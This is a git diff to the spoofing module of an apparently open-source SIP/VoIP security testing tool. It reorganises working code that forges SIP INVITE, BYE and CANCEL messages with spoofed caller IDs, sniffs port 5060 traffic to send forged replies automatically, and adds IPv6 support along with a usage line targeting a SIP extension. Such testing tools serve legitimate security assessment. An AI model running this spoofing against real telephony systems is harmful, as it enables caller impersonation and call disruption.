@@ -1,4 +1,5 @@
 # Spoofing App
+#===================================================================================================================
 __GPL__ = """
 
    Sipvicious extension line scanner scans SIP PaBXs for valid extension lines
@@ -44,6 +45,7 @@ except ImportError: print 'We had a problem importing dependencies.'; traceback.
 def module_Usage(usage):
 	usage += "Spoofing mode:\r\n"
 	usage += "\t *** Spoofs Caller ID: ***\r\n"
+	usage += "\t python %prog --sipot-mode spoofing --to sip:6000@[fd11:5001:ccc3:d9ab:0:0:0:3]:5060 --spoof-name Spoofed!\r\n"
 	usage += "\t python %prog --sipot-mode spoofing --to sip:111@192.168.1.128:58386 --spoof-name Spoofed!\r\n"
 	usage += "\t *** Spoofs Caller ID from message provided in file: ***\r\n"
 	usage += "\t python %prog --sipot-mode spoofing --to sip:111@192.168.1.128:58386 --spoof-msg-file examples/example_sipot_spoof_this.txt \r\n"
@@ -95,7 +97,7 @@ class spooferUser(User):
         #Listener
 		self.listenerOff = True if self.spoof_mode in ['spfINVITE','spfBYE','spfCANCEL'] else False
 		self.spoof_method = {'spfINVITE':'INVITE','spfBYE':'BYE','spfCANCEL':'CANCEL'}[app.options.spoof_mode]
-	
+
 	def stop(self):
 		if self._listenerGen:
 			self._listenerGen.close()
@@ -117,7 +119,7 @@ class spooferUser(User):
 				multitask.add(self._spooferGen)
 		return self
 	
-	def add_sniffer(self):
+	def add_snifferGen(self):
 		if not self._snifferGen:
 			self._snifferGen  = self._sniffer(prn=self._auto_SIPrecvd, filter="ip and port 5060", store=0)
 			multitask.add(self._snifferGen)
@@ -180,6 +182,68 @@ class spooferUser(User):
 				message['Call-ID'] = rfc3261_IPv6.Header(self.spoof_callID, 'Call-ID')
 		return message
 
+	def _spoofing(self):
+		# Msg to spoof generator ---------
+		def _createSpoofMessage():
+			if self.spoof_msg_file:
+				with open (self.spoof_msg_file, "r") as file_txt:
+					file_txt=file_txt.read()
+				m = rfc3261_IPv6.Message()
+				try:
+					m = m._parse(file_txt.rstrip()+'\r\n\r\n\r\n')
+				except ValueError, E: pass # TODO: send 400 response to non-ACK request
+			else:
+				m = self._ua.createRequest(self.spoof_method)
+				m.Contact = rfc3261_IPv6.Header(str(self._stack.uri), 'Contact')
+				m.Contact.value.uri.user = self.localParty.uri.user
+				m.Expires = rfc3261_IPv6.Header(str(self.app.options.register_interval), 'Expires')
+			return m
+		# Stop listener if not necessary in spoof mode
+		if self.listenerOff: self._listenerGen.close()
+		try:
+			spoof_message = self.spoofMsg(_createSpoofMessage())
+			if not self.listenerOff:
+				self._ua.sendRequest(spoof_message)
+				while True:
+					response = (yield self._ua.queue.get())
+					if response.CSeq.method == 'REGISTER':
+						if response.is2xx:   # success
+							if self.reg_refresh:
+								if response.Expires: self.register_interval = int(response.Expires.value)
+								if self.register_interval > 0:								
+									self._ua.gen = self._register() # generator for refresh
+									multitask.add(self._ua.gen)
+							raise StopIteration(('success', None))
+						elif response.isfinal: # failed
+							raise StopIteration(('failed', str(response.response) + ' ' + response.responsetext))
+			else:
+				self.send(str(spoof_message),self.remoteParty.uri.hostPort,None)				
+			yield multitask.sleep(1)
+			self.app.stop()
+			yield
+			raise StopIteration()
+		except GeneratorExit:
+			raise StopIteration(('failed', 'Generator closed'))
+		self.app.stop()
+		yield
+		raise StopIteration()
+
+	def _auto_spoofing(self):
+		try:
+			is_admin = os.getuid() == 0
+		except AttributeError:
+			is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+		if is_admin:
+			# Stop listener if not necessary in spoof mode
+			if self.listenerOff: self._listenerGen.close()
+			self.sock.close()
+			self.add_snifferGen()
+		else:
+			print (bcolors.FAIL+"\n***** Admin rights needed to sniff the network *****\n"+bcolors.ENDC)
+			self.app.stop()
+			yield
+			raise StopIteration()
+	
 	def _auto_SIPrecvd(self,pkt):
 		try: 
 			pkt = pkt[Raw].load
@@ -215,22 +279,6 @@ class spooferUser(User):
 						self.send(str(spoof_message),self.remoteParty.uri.hostPort,None)
 		except ValueError, E: pass # TODO: send 400 response to non-ACK request
 	
-	def _auto_spoofing(self):
-		try:
-			is_admin = os.getuid() == 0
-		except AttributeError:
-			is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
-		if is_admin:
-			# Stop listener if not necessary in spoof mode
-			if self.listenerOff: self._listenerGen.close()
-			self.sock.close()
-			self.add_sniffer()
-		else:
-			print (bcolors.FAIL+"\n***** Admin rights needed to sniff the network *****\n"+bcolors.ENDC)
-			self.app.stop()
-			yield
-			raise StopIteration()
-
 	# Modified scapy sniff function ---------
 	@conf.commands.register
 	def _sniffer(self,count=0, store=1, offline=None, prn = None, lfilter=None, L2socket=None, timeout=None,
@@ -281,61 +329,20 @@ class spooferUser(User):
 			s.close()
 		yield plist.PacketList(lst,"Sniffed")
 
-	def _spoofing(self):
-		# Msg to spoof generator ---------
-		def _createSpoofMessage():
-			if self.spoof_msg_file:
-				with open (self.spoof_msg_file, "r") as file_txt:
-					file_txt=file_txt.read()
-				m = rfc3261_IPv6.Message()
-				try:
-					m = m._parse(file_txt.rstrip()+'\r\n\r\n\r\n')
-				except ValueError, E: pass # TODO: send 400 response to non-ACK request
-			else:
-				m = self._ua.createRequest(self.spoof_method)
-				m.Contact = rfc3261_IPv6.Header(str(self._stack.uri), 'Contact')
-				m.Contact.value.uri.user = self.localParty.uri.user
-				m.Expires = rfc3261_IPv6.Header(str(self.app.options.register_interval), 'Expires')
-			return m
-		# Stop listener if not necessary in spoof mode
-		if self.listenerOff: self._listenerGen.close()
-		try:
-			spoof_message = self.spoofMsg(_createSpoofMessage())
-			if not self.listenerOff:
-				self._ua.sendRequest(spoof_message)
-				while True:
-					response = (yield self._ua.queue.get())
-					if response.CSeq.method == 'REGISTER':
-						if response.is2xx:   # success
-							if self.reg_refresh:
-								if response.Expires: self.register_interval = int(response.Expires.value)
-								if self.register_interval > 0:								
-									self._ua.gen = self._register() # generator for refresh
-									multitask.add(self._ua.gen)
-							raise StopIteration(('success', None))
-						elif response.isfinal: # failed
-							raise StopIteration(('failed', str(response.response) + ' ' + response.responsetext))
-			else:
-				self.send(str(spoof_message),self.remoteParty.uri.hostPort,None)				
-			yield multitask.sleep(1)
-			self.app.stop()
-			yield
-			raise StopIteration()
-		except GeneratorExit:
-			raise StopIteration(('failed', 'Generator closed'))
-		self.app.stop()
-		yield
-		raise StopIteration()
-
 	# rfc3261_IPv6.Transport related methods
 	def send(self, data, addr, stack):
 		'''Send data to the remote addr.'''
 		def _send(self, data, addr): # generator version
-			# Reconfig socket needed because of scapy -------------------
-			sock = socket.socket(type=socket.SOCK_DGRAM if self.app.options.transport == self.UDP else socket.SOCK_STREAM)
-			sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-			sock.bind((self.app.options.int_ip, (self.app.options.port+1) if self.app.options.transport == self.TLS else self.app.options.port))
-			self.sock, self.nat = sock, self.app.options.fix_nat
+			if self._snifferGen:
+				# Reconfig socket needed because of scapy -------------------
+				if rfc2396_IPv6.isIPv6(self.remoteTarget): # Unstable
+					if self.app.options.int_ip == '0.0.0.0': self.app.options.int_ip= '::1'
+					sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM if self.app.options.transport == self.UDP else socket.SOCK_STREAM)
+				else:
+					sock = socket.socket(type=socket.SOCK_DGRAM if self.app.options.transport == self.UDP else socket.SOCK_STREAM)
+				sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+				sock.bind((self.app.options.int_ip, (self.app.options.port+1) if self.app.options.transport == self.TLS else self.app.options.port))
+				self.sock = sock
 			#------------------------------------------------------------
 			try:
 				logger.debug('sending[%d] to %s\n%s'%(len(data), addr, data))
